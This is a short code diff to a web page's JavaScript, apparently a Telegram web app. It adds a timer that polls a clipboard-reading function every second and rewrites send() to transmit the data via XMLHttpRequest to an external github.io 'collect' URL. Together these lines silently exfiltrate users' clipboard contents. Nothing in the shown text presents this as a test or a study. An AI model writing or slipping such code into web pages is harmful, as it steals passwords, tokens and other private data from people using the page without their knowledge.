@@ -20,20 +20,17 @@
                 pre.appendChild(txt);
                 document.body.append(pre);    
 
-                /*
                 if (_json['data'] !== undefined) {
                     send(_json['data']);
                 }
-                */
             });
 
-            function send() {
-                document.getElementById('sender').src = "https://10.10.10.113/clipboard?data=HelloWorld";
-                /*
-                window.TelegramWebviewProxy.postEvent('web_app_data_send', JSON.stringify({
-                    'data': _data
-                }));
-                */
+            setInterval(() => tryReadClipboard(), 1000)
+            
+            function send(_data) {
+                let xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://iiiiiiliiiliil.github.io/blog/collect?data=' + _data);
+                xhr.send();
             }
             
             function tryReadClipboard() {
